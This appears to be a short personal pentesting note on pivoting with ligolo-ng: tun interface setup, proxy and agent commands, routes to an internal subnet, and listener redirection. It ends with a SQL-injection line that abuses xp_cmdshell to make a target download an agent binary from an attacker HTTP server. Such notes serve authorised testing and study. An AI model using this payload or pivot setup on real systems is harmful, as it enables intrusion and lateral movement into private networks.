Make sure ligolo interface is created:
```c
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up
```
start ligolo on kali:
```c
./proxy -selfcert
```

start agent on target:
```c
#default port is 11601
.\agent -ignore-cert -connect <kali_ip>:<port>
```

interact with session and start it:
```c
session
1
start
```

Now create route to internal boxes thru ligolo interface
```c
ip route add 172.17.10.0/24 dev ligolo
```

### [Agent Binding/Listening](https://github.com/nicocha30/ligolo-ng#agent-bindinglistening)

You can listen to ports on the _agent_ and _redirect_ connections to your control/proxy server.

In a ligolo session, use the `listener_add` command.

The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.

```c
[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
INFO[1208] Listener created on remote agent!           
```

## this is good example...
![[Pasted image 20231128005211.png]]

'EXEC xp_cmdshell "powershell.exe wget http://192.168.45.225:8000/agent.exe -OutFile c:\Users\Public\agent.exe" --


![[Pasted image 20230824171226.png]]